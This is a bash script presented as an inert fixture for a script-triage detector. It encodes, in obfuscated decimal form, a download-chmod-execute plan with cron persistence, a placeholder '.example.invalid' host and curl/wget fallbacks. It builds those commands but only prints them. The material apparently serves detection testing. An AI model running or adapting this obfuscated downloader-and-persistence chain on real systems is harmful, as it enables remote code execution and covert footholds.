#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_8e788d6d='148 91 79 154 145 146 131 142 145 91 142 144 141 132 135 138 131 125 134 141 145 146 74 127 129 143 147 135 144 131 125 144 131 139 141 146 131 74 149 144 135 146 131 125 132 135 138 131 74 129 134 127 140 133 131 125 139 141 130 131 74 130 135 145 142 127 146 129 134 125 142 144 141 129 131 145 145 154 127 130 127 142 146 131 144 91 139 147 138 146 135 125 147 146 135 138 135 146 151 125 132 127 138 138 128 127 129 137 154 145 146 127 133 131 125 129 141 147 140 146 91 83 154 129 127 139 142 127 135 133 140 125 135 130 91 129 127 139 142 127 135 133 140 75 132 131 81 127 132 79 128 81 82 81 154 147 144 138 91 134 146 146 142 145 88 77 77 132 131 81 127 132 79 128 81 82 81 76 131 150 127 139 142 138 131 76 135 140 148 127 138 135 130 77 84 130 87 86 85 132 130 82 76 145 134 154 147 145 131 144 125 127 133 131 140 146 91 102 147 140 146 144 131 145 145 106 127 128 77 132 131 81 127 132 79 128 81 82 81 154 132 135 138 131 125 142 127 146 134 91 77 146 139 142 77 134 147 140 146 144 131 145 145 75 129 127 129 134 131 77 76 145 146 127 133 131 75 132 131 81 127 132 79 128 81 82 81 154 127 144 129 134 125 142 144 141 128 131 91 147 140 127 139 131 75 139 154 145 131 144 148 135 129 131 125 140 127 139 131 91 147 142 130 127 146 131 75 132 131 81 127 132 79 128 81 82 81 76 145 131 144 148 135 129 131 154 129 144 141 140 125 142 127 146 134 91 77 131 146 129 77 129 144 141 140 76 130 77 147 142 130 127 146 131 75 132 131 81 127 132 79 128 81 82 81'
readonly Codec_8e788d6d='decimal_space|add_modulo_256|1e'

Load_8e788d6d() {
  v_a19c=()
  local IFS=' '
  read -r -a v_a19c <<< "${Material_8e788d6d}"
}

Decode_8e788d6d() {
  v_b27e=()
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$(((v_a19c[v_e598] - 30 + 256) % 256))")
  done
}

Recover_8e788d6d() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  local -a compass=(north south); v_d41a="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_8e788d6d
  for v_b803 in 1; do Decode_8e788d6d; done
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_8e788d6d() { local recovered; recovered="$(Recover_8e788d6d)"; printf '%s\n' "$recovered"; }

Plan_8e788d6d() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_8e788d6d)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_8e788d6d; fi
